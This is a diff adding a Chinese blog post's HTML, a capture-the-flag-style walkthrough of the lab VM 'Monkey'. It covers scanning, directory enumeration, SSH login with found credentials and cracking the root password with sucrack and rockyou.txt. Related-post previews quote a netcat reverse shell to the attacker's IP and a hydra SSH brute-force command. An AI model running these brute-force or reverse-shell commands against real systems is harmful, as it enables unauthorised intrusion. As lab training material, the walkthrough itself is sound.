@@ -1,0 +1,199 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>群友靶机之Monkey | 再努力一点，她是不是就会回来</title><meta name="author" content="陈羽琳"><meta name="copyright" content="陈羽琳"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="123获取靶机地址：https:&#x2F;&#x2F;maze-sec.com&#x2F;qq群：660930334  配置：12345678910111213靶机用VirtualBox制作，VMware导入可能网卡不兼容用户:todd 密码:qq6609303341. 启动虚拟机时按&#96;e&#96;键进入GRUB编辑模式2. 修改启动参数：将&#96;ro&#96;改为&#96;rw single init&#x3D;&#x2F;bin&#x2F;bash&#96;3. 按Ctrl+X启动进入">
+<meta property="og:type" content="article">
+<meta property="og:title" content="群友靶机之Monkey">
+<meta property="og:url" content="https://cyl-love.github.io/posts/30095.html">
+<meta property="og:site_name" content="再努力一点，她是不是就会回来">
+<meta property="og:description" content="123获取靶机地址：https:&#x2F;&#x2F;maze-sec.com&#x2F;qq群：660930334  配置：12345678910111213靶机用VirtualBox制作，VMware导入可能网卡不兼容用户:todd 密码:qq6609303341. 启动虚拟机时按&#96;e&#96;键进入GRUB编辑模式2. 修改启动参数：将&#96;ro&#96;改为&#96;rw single init&#x3D;&#x2F;bin&#x2F;bash&#96;3. 按Ctrl+X启动进入">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cyl-love.github.io/img/1.jpg">
+<meta property="article:published_time" content="2025-12-24T13:05:11.000Z">
+<meta property="article:modified_time" content="2025-12-24T13:13:06.567Z">
+<meta property="article:author" content="陈羽琳">
+<meta property="article:tag" content="渗透测试">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cyl-love.github.io/img/1.jpg"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "群友靶机之Monkey",
+  "url": "https://cyl-love.github.io/posts/30095.html",
+  "image": "https://cyl-love.github.io/img/1.jpg",
+  "datePublished": "2025-12-24T13:05:11.000Z",
+  "dateModified": "2025-12-24T13:13:06.567Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "陈羽琳",
+      "url": "https://cyl-love.github.io"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/1.jpg"><link rel="canonical" href="https://cyl-love.github.io/posts/30095.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":true},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '群友靶机之Monkey',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg" style="background-image: url(/img/2.png);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/1.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">19</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">5</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">5</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间线</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/2.png);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><img class="site-icon" src="/img/1.jpg" alt="Logo"><span class="site-name">再努力一点，她是不是就会回来</span></a><a class="nav-page-title" href="/"><span class="site-name">群友靶机之Monkey</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间线</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">群友靶机之Monkey</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-12-24T13:05:11.000Z" title="发表于 2025-12-24 21:05:11">2025-12-24</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-12-24T13:13:06.567Z" title="更新于 2025-12-24 21:13:06">2025-12-24</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E7%BE%A4%E5%8F%8B%E9%9D%B6%E6%9C%BA/">群友靶机</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">获取靶机地址：</span><br><span class="line">https://maze-sec.com/</span><br><span class="line">qq群：660930334</span><br></pre></td></tr></table></figure>
+
+<h1 id="配置："><a href="#配置：" class="headerlink" title="配置："></a>配置：</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">靶机用VirtualBox制作，VMware导入可能网卡不兼容</span><br><span class="line">用户:todd 密码:qq660930334</span><br><span class="line">1. 启动虚拟机时按`e`键进入GRUB编辑模式</span><br><span class="line">2. 修改启动参数：将`ro`改为`rw single init=/bin/bash`</span><br><span class="line">3. 按Ctrl+X启动进入单用户模式</span><br><span class="line">vim /etc/network/interfaces</span><br><span class="line">allow-hotplug ens33</span><br><span class="line">iface ens33 inet dhcp</span><br><span class="line"></span><br><span class="line">ip link set ens33 up</span><br><span class="line">dhclient ens33</span><br><span class="line"></span><br><span class="line">reboot -f</span><br></pre></td></tr></table></figure>
+
+<h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><p><img src="/../images/image-20251202185816480.png" alt="image-20251202185816480"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">依旧是22,80端口</span><br></pre></td></tr></table></figure>
+
+<h1 id="80端口探索"><a href="#80端口探索" class="headerlink" title="80端口探索"></a>80端口探索</h1><p><img src="/../images/image-20251202185929108.png" alt="image-20251202185929108"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">进来是一个html，在源代码提示了个域名，依旧放到hosts当中8</span><br><span class="line">sudo vim /etc/hosts</span><br><span class="line">192.168.44.139 open.dsz</span><br></pre></td></tr></table></figure>
+
+<h1 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h1><p><img src="/../images/image-20251202190156489.png" alt="image-20251202190156489"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这里出题人对dirsearch进行了限制，扫不出东西，换成gobuster来试试</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/image-20251202191534557.png" alt="image-20251202191534557"></p>
+<h1 id="tip点切入"><a href="#tip点切入" class="headerlink" title="tip点切入"></a>tip点切入</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">出了两个文件，其实bak.zip里面就是monkey.js</span><br><span class="line">给了一个js脚本，题目又提示篡改猴，在篡改猴里面保存脚本</span><br><span class="line">【或者直接在域名下，浏览器控制台使用脚本】</span><br><span class="line">去访问域名，因为脚本里面进行了限制，直接访问ip没有区别</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/image-20251202191906762.png" alt="image-20251202191906762"></p>
+<p><img src="/../images/image-20251202192338070.png" alt="image-20251202192338070"></p>
+<p><img src="/../images/image-20251202192404625.png" alt="image-20251202192404625"></p>
+<p><img src="/../images/image-20251202192438478.png"></p>
+<p><img src="/../images/image-20251202192845077.png" alt="image-20251202192845077"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">因为是随机的，不一定一下就获得正确的账号和密码</span><br><span class="line">segfault/segfaultNo1</span><br><span class="line">ssh segfault@192.168.44.142</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/image-20251202193100118.png" alt="image-20251202193100118"></p>
+<h1 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br><span class="line">/opt/monkey/bin/monkey</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/image-20251202193147461.png" alt="image-20251202193147461"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">给了一个猴子编程器，但是并没有什么点可以使用,查看相应的隐藏文件</span><br><span class="line">find / -name &#x27;.*&#x27; 2&gt;/dev/null</span><br><span class="line">发现有一个hint文件</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/image-20251202193527917.png" alt="image-20251202193527917"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">提示给了一个爆破工具sucrack，那应该就是爆破root用户的密码</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/image-20251202193654308.png" alt="image-20251202193654308"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">在kali拿一个字典过来跑一下</span><br><span class="line">python -m http.server</span><br><span class="line">wget 192.168.44.128:8000/rockyou.txt</span><br><span class="line">sucrack -a -w 20 -s 10 -u root -rl AFLafld rockyou.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/image-20251202194540419.png" alt="image-20251202194540419"></p>
+<p><img src="/../images/image-20251202194706578.png" alt="image-20251202194706578"></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://cyl-love.github.io">陈羽琳</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://cyl-love.github.io/posts/30095.html">https://cyl-love.github.io/posts/30095.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://cyl-love.github.io" target="_blank">再努力一点，她是不是就会回来</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a></div><div class="post-share"><div class="social-share" data-image="/img/1.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/posts/34438.html" title="群友靶机之Open"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">群友靶机之Open</div></div><div class="info-2"><div class="info-item-1">123获取靶机地址：https://maze-sec.com/qq群：660930334  配置：123456789101112靶机用VirtualBox制作，VMware导入可能网卡不兼容用户:todd 密码:qq6609303341. 启动虚拟机时按`e`键进入GRUB编辑模式2. 修改启动参数：将`ro`改为`rw single init=/bin/bash`3. 按Ctrl+X启动进入单用户模式vim /etc/network/interfacesallow-hotplug ens33iface ens33 inet dhcpip link set ens33 updhclient ens33reboot -f  端口扫描 1依旧经典的80端口加22端口，但是这里的80端口显示重定向到open.dsz，正常直接访问是访问不到的，做了个域名映射  80端口探测12sudo vim /etc/hosts192.168.44.139 open.dsz  远程文件包含12正常进来之后提示是一个远程文件包含(RFI)测试工具通过http://open@格式进行URL处理   反弹s...</div></div></div></a><a class="pagination-related" href="/posts/24144.html" title="群友靶机之babypass"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">群友靶机之babypass</div></div><div class="info-2"><div class="info-item-1">123获取靶机地址：https://maze-sec.com/qq群：660930334  配置：12345678910111213靶机用VirtualBox制作，VMware导入可能网卡不兼容用户:todd 密码:qq6609303341. 启动虚拟机时按`e`键进入GRUB编辑模式2. 修改启动参数：将`ro`改为`rw single init=/bin/bash`3. 按Ctrl+X启动进入单用户模式vim /etc/network/interfacesallow-hotplug ens33iface ens33 inet dhcpip link set ens33 updhclient ens33reboot -f  主机发现 端口扫描 tip点探索80端口探测1进去一个hello world f12查看源码提示有套tms，进去/tms发现一套旅游管理系统，但是没看出来是什么常见的cms   目录扫描1dirsearch -u http://192.168.44.137/tms    信息泄露1把200响应包都看看，发现readme.txt有前后端账号密码的泄露   12...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/posts/63247.html" title="群友靶机之5ud0"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-12-24</div><div class="info-item-2">群友靶机之5ud0</div></div><div class="info-2"><div class="info-item-1">123获取靶机地址：https://maze-sec.com/qq群：660930334  配置：123456789101112靶机用VirtualBox制作，VMware导入可能网卡不兼容用户:todd 密码:qq6609303341. 启动虚拟机时按`e`键进入GRUB编辑模式2. 修改启动参数：将`ro`改为`rw single init=/bin/bash`3. 按Ctrl+X启动进入单用户模式vim /etc/network/interfacesallow-hotplug ens33iface ens33 inet dhcpip link set ens33 updhclient ens33reboot -f  端口扫描 180端口和22端口，80端口是一个Textpattern CMS，过去看看  80端口探测12345访问一下显示无法访问，发现跳转到了textpattern.dsz 那就把放他到hosts当中sudo vim /etc/hosts192.168.44.153 textpattern.dsz 再次访问,可以正常访问了    nday利用1搜索一下Tex...</div></div></div></a><a class="pagination-related" href="/posts/41646.html" title="群友靶机之Lzh"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-12-24</div><div class="info-item-2">群友靶机之Lzh</div></div><div class="info-2"><div class="info-item-1">123获取靶机地址：https://maze-sec.com/qq群：660930334    配置：123456789101112靶机用VirtualBox制作，VMware导入可能网卡不兼容用户:todd 密码:qq6609303341. 启动虚拟机时按`e`键进入GRUB编辑模式2. 修改启动参数：将`ro`改为`rw single init=/bin/bash`3. 按Ctrl+X启动进入单用户模式vim /etc/network/interfacesallow-hotplug ens33iface ens33 inet dhcpip link set ens33 updhclient ens33reboot -f  端口扫描 1依旧是22,80端口  目录扫描 1给了个cms的源码,应该是有部署了这一套的cms，尝试访问/mozilo/   立足点12如果是cms，那应该就是打的nday了【之前打的awd倒是很多这种】版本也给了，直接搜发现有个rce的洞   123看了利用方式那就是后台直接upload文件上传，然后在/kategorien/Willkommen/dat...</div></div></div></a><a class="pagination-related" href="/posts/47096.html" title="群友靶机之7r1umph"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-12-24</div><div class="info-item-2">群友靶机之7r1umph</div></div><div class="info-2"><div class="info-item-1">123获取靶机地址：https://maze-sec.com/qq群：660930334  配置：12345678910111213靶机用VirtualBox制作，VMware导入可能网卡不兼容用户:todd 密码:qq6609303341. 启动虚拟机时按`e`键进入GRUB编辑模式2. 修改启动参数：将`ro`改为`rw single init=/bin/bash`3. 按Ctrl+X启动进入单用户模式vim /etc/network/interfacesallow-hotplug ens33iface ens33 inet dhcpip link set ens33 updhclient ens33reboot -f  端口扫描 1依旧是22,80端口  目录扫描 1index.php有一个上传口，/upload和/tmp是可访问文件目录口，/info.php是php的phpinfo，抓包走一遍文件上传逻辑    1文件上传的时候没啥限制，发现上传之后会在upload上但是后缀名加成.dsz,也会出现在/tmp上但是再点击的时候，就显示404，该文件也消失掉了，那思路应该就...</div></div></div></a><a class="pagination-related" href="/posts/34438.html" title="群友靶机之Open"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-12-24</div><div class="info-item-2">群友靶机之Open</div></div><div class="info-2"><div class="info-item-1">123获取靶机地址：https://maze-sec.com/qq群：660930334  配置：123456789101112靶机用VirtualBox制作，VMware导入可能网卡不兼容用户:todd 密码:qq6609303341. 启动虚拟机时按`e`键进入GRUB编辑模式2. 修改启动参数：将`ro`改为`rw single init=/bin/bash`3. 按Ctrl+X启动进入单用户模式vim /etc/network/interfacesallow-hotplug ens33iface ens33 inet dhcpip link set ens33 updhclient ens33reboot -f  端口扫描 1依旧经典的80端口加22端口，但是这里的80端口显示重定向到open.dsz，正常直接访问是访问不到的，做了个域名映射  80端口探测12sudo vim /etc/hosts192.168.44.139 open.dsz  远程文件包含12正常进来之后提示是一个远程文件包含(RFI)测试工具通过http://open@格式进行URL处理   反弹s...</div></div></div></a><a class="pagination-related" href="/posts/55978.html" title="群友靶机之React"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-12-24</div><div class="info-item-2">群友靶机之React</div></div><div class="info-2"><div class="info-item-1">123获取靶机地址：https://maze-sec.com/qq群：660930334  配置：123456789101112靶机用VirtualBox制作，VMware导入可能网卡不兼容用户:todd 密码:qq6609303341. 启动虚拟机时按`e`键进入GRUB编辑模式2. 修改启动参数：将`ro`改为`rw single init=/bin/bash`3. 按Ctrl+X启动进入单用户模式vim /etc/network/interfacesallow-hotplug ens33iface ens33 inet dhcpip link set ens33 updhclient ens33reboot -f  端口扫描 180,22,3000端口，在3000端口看到是nextjs最新的 CVE-2025-66478 rce漏洞  nday1为了方便后期实现就反弹shell到kali上面，busybox nc 192.168.44.128 4444 -e bash   123456789101112131415161718192021222324252627282930...</div></div></div></a><a class="pagination-related" href="/posts/60187.html" title="群友靶机之Vimer"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-12-24</div><div class="info-item-2">群友靶机之Vimer</div></div><div class="info-2"><div class="info-item-1">123获取靶机地址：https://maze-sec.com/qq群：660930334  配置：123456789101112靶机用VirtualBox制作，VMware导入可能网卡不兼容用户:todd 密码:qq6609303341. 启动虚拟机时按`e`键进入GRUB编辑模式2. 修改启动参数：将`ro`改为`rw single init=/bin/bash`3. 按Ctrl+X启动进入单用户模式vim /etc/network/interfacesallow-hotplug ens33iface ens33 inet dhcpip link set ens33 updhclient ens33reboot -f  端口扫描 122,80,113端口，113端口泄露了vim用户名，先尝试爆破ssh，再去看看80端口  80端口探测  1是一个vim，没有什么特别的东西  爆破获得用户账号密码12hydra -l vim -P /usr/share/wordlists/rockyou.txt 192.168.44.151 sshvim/000001  ssh连接1ssh vi...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/1.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">陈羽琳</div><div class="author-info-description">每天能不能pwn一点</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">19</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">5</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">5</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/cyl-love"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/cyl-love" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">Love life, always—loveforver in the small.</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%85%8D%E7%BD%AE%EF%BC%9A"><span class="toc-number">1.</span> <span class="toc-text">配置：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-number">2.</span> <span class="toc-text">端口扫描</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#80%E7%AB%AF%E5%8F%A3%E6%8E%A2%E7%B4%A2"><span class="toc-number">3.</span> <span class="toc-text">80端口探索</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F"><span class="toc-number">4.</span> <span class="toc-text">目录扫描</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#tip%E7%82%B9%E5%88%87%E5%85%A5"><span class="toc-number">5.</span> <span class="toc-text">tip点切入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-number">6.</span> <span class="toc-text">权限提升</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/47096.html" title="群友靶机之7r1umph">群友靶机之7r1umph</a><time datetime="2025-12-24T13:06:56.000Z" title="发表于 2025-12-24 21:06:56">2025-12-24</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/63247.html" title="群友靶机之5ud0">群友靶机之5ud0</a><time datetime="2025-12-24T13:06:46.000Z" title="发表于 2025-12-24 21:06:46">2025-12-24</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/34595.html" title="群友靶机之wechat">群友靶机之wechat</a><time datetime="2025-12-24T13:06:38.000Z" title="发表于 2025-12-24 21:06:38">2025-12-24</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/60187.html" title="群友靶机之Vimer">群友靶机之Vimer</a><time datetime="2025-12-24T13:06:31.000Z" title="发表于 2025-12-24 21:06:31">2025-12-24</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/47936.html" title="群友靶机之victorique">群友靶机之victorique</a><time datetime="2025-12-24T13:06:09.000Z" title="发表于 2025-12-24 21:06:09">2025-12-24</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(/img/2.png);"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;2025 By 陈羽琳</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.4.0-b3</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog 